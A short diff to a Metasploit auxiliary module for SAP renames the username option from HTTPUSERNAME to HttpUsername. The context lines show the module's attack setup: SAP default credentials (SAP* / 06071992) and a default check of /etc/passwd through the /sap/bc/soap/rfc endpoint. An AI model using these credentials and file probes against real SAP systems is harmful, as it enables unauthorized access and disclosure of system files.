@@ -52,7 +52,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       OptString.new('CLIENT', [true, 'SAP Client', '001']),
-      OptString.new('HTTPUSERNAME', [true, 'Username', 'SAP*']),
+      OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
       OptString.new('HttpPassword', [true, 'Password', '06071992']),
       OptString.new('FILEPATH',[true,'File Path to check for  (e.g. /etc)','/etc/passwd'])
     ], self.class)
@@ -77,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
         'data' => data,
-        'authorization' => basic_auth(datastore['HTTPUSERNAME'], datastore['HttpPassword']),
+        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
         'ctype' => 'text/xml; charset=UTF-8',
         'headers' => {
